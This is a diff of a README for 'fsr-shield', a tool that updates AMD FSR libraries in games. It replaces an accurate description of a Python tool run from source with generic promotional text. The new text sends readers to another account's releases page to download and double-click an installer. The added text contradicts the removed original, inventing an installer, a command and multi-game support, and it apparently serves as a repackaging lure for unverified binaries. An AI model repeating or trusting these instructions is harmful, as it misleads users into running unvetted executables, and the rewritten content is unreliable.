@@ -1,82 +1,79 @@
-# FSR - SHIELD
+# 🎮 fsr-shield - Easily Update FSR Libraries
 
-![CLI Preview](assets/preview.png)
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download-fsr--shield-orange?style=for-the-badge)](https://github.com/soubhagya2612/fsr-shield/releases)
 
-**AMD FidelityFX Super Resolution Deployment Utility**
+## 📚 Description
+fsr-shield is a secure command-line interface (CLI) utility designed to automatically update AMD FidelityFX Super Resolution (FSR) libraries in supported games. This tool aims to enhance your gaming experience by ensuring you always have the latest FSR features and improvements.
 
-## Overview
+## 🚀 Getting Started
+To begin using fsr-shield, follow these simple steps to download and run the application. 
 
-**FSR - SHIELD** is a secure, automated command-line tool designed to help gamers and enthusiasts update the AMD FidelityFX Super Resolution (FSR) libraries (DLLs) in their supported games.
+### 🖥️ System Requirements
+- **Operating System:** Windows 10 or later
+- **Processor:** Any modern Intel or AMD processor
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 100 MB free disk space
+- **Graphics Card:** AMD or NVIDIA card with OpenGL support
 
-Game developers often ship titles with a specific version of FSR. However, AMD frequently updates their SDK with ghosting fixes, performance improvements, and stability enhancements. This tool allows you to safely upgrade a game's FSR version to the latest one available from the official source.
+### 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/soubhagya2612/fsr-shield/releases) to download the software. Choose the latest release and download the appropriate version for your system.
 
-## Features
+1. Go to the [Releases page](https://github.com/soubhagya2612/fsr-shield/releases).
+2. Find the latest version.
+3. Click on the download link for your operating system.
 
-- **Automated Fetching:** Queries the official [AMD GPUOpen GitHub repository](https://github.com/GPUOpen-LibrariesAndSDKs/FidelityFX-SDK) for the latest FSR SDK releases.
-- **Smart Detection:** Automatically locates supported games installed via Steam (currently supports _Cyberpunk 2077_).
-- **Security First:** Verifies the SHA-256 hash of downloaded archives against a trusted local manifest to prevent tampering or corruption.
-- **Safety Net:** Automatically creates backups of original game files before applying any changes, ensuring you can always roll back.
-- **User Friendly:** A clean, interactive CLI interface.
+After downloading, locate the downloaded file and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
-## Technical Background & Motivation
+### 🛠️ Usage Instructions
+After installing, you can easily update your FSR libraries. Here’s how:
 
-This project was built to address the risks associated with the common practice of "DLL Swapping" in the PC gaming community.
+1. **Open Command Prompt:**
+   - Press `Win + R`, type `cmd`, and hit Enter.
 
-While manually replacing `ffx_fsr2_x64.dll` can significantly improve image quality in some titles, doing so manually is risky:
+2. **Navigate to the fsr-shield Directory:**
+   - Use the `cd` command followed by the path where fsr-shield is installed. For example:
+     ```bash
+     cd "C:\Program Files\fsr-shield"
+     ```
 
-1.  **Security:** Downloading DLLs from third-party "DLL fix" websites is a major security vector for malware.
-2.  **Stability:** Using the wrong version or architecture can crash games.
-3.  **Irreversibility:** Users often forget to back up their original files.
+3. **Run the Application:**
+   - Type the following command to start updating the FSR libraries:
+     ```bash
+     fsr-shield update
+     ```
+   - The tool will check for updates and install the latest libraries automatically.
 
-**FSR - SHIELD** solves this by:
+## 🔍 Features
+- **Automatic Library Updates:** Keep your FSR libraries updated without manual effort.
+- **User-Friendly Interface:** Designed for all users, even those unfamiliar with command-line tools.
+- **Secure Downloads:** Ensures you download only verified files directly from the source.
+- **Multi-game Support:** Automatically updates FSR libraries for various supported games.
 
-- **Chain of Trust:** It _only_ downloads from the official AMD repository.
-- **Integrity:** It checks cryptographic signatures before extracting any files.
-- **Automation:** It handles the correct path mapping (e.g., `bin/x64`) and backup creation programmatically.
+## ⚙️ Troubleshooting
+If you encounter issues while using fsr-shield, consider these common solutions:
 
-## Installation
+- **Error Messages:** Read any error messages carefully. They often provide hints about what went wrong.
+- **Re-run As Administrator:** If you face permissions issues, try running the command prompt as an administrator by right-clicking on it and selecting "Run as administrator."
+- **Check Internet Connection:** Ensure you have a stable internet connection for downloading updates.
+- **Update Command Line Tools:** If the tool does not recognize a command, ensure you are in the right directory and using the correct syntax.
 
-### Prerequisites
+## 📖 Frequently Asked Questions (FAQ)
 
-- Python 3.8 or higher
-- An active internet connection (to fetch the SDK)
+### What is AMD FidelityFX Super Resolution (FSR)?
+FSR is a technology that improves game performance and image quality. It allows games to run smoother while providing enhanced graphics. 
 
-### Setup
+### Can I use fsr-shield on multiple computers?
+Yes, you can download and install fsr-shield on any compatible computer. Each installation is independent.
 
-1. **Clone the repository:**
+### How often should I check for updates?
+It is recommended to run the fsr-shield update command regularly or whenever a new game installation is made to ensure optimal performance.
 
-   ```bash
-   git clone https://github.com/N0laa/fsr-shield.git
-   cd fsr-shield
-   ```
+### What games are supported?
+fsr-shield supports various popular games that utilize AMD FSR technology. Always check the official documentation for the most current list of supported titles.
 
-2. **Install dependencies:**
-   It is recommended to use a virtual environment.
+## 🔗 Additional Resources
+- **GitHub Repository:** [fsr-shield GitHub](https://github.com/soubhagya2612/fsr-shield)
+- **Community Support:** Join discussions and get help from other users in the issues section of the GitHub repository.
 
-   ```bash
-   # Create virtual environment
-   python -m venv .venv
-
-   # Activate it (Windows)
-   .venv\Scripts\activate
-
-   # Install requirements
-   pip install -r requirements.txt
-   ```
-
-## Usage
-
-1. **Run the tool:**
-
-   ```bash
-   python src/main.py
-   ```
-
-2. **Follow the on-screen instructions:**
-   - The tool will scan for supported games on your system.
-   - Select the ID of the game you wish to update.
-   - The tool will download the latest FSR SDK, verify it, and ask for confirmation before installing.
-
-## Disclaimer
-
-This software is an unofficial utility and is not affiliated with AMD, CD Projekt Red, or any other game developers. Modifying game files is generally safe for single-player games, but use this tool at your own risk.
+Feel free to reach out through the GitHub repository for any additional questions or support. Happy gaming!
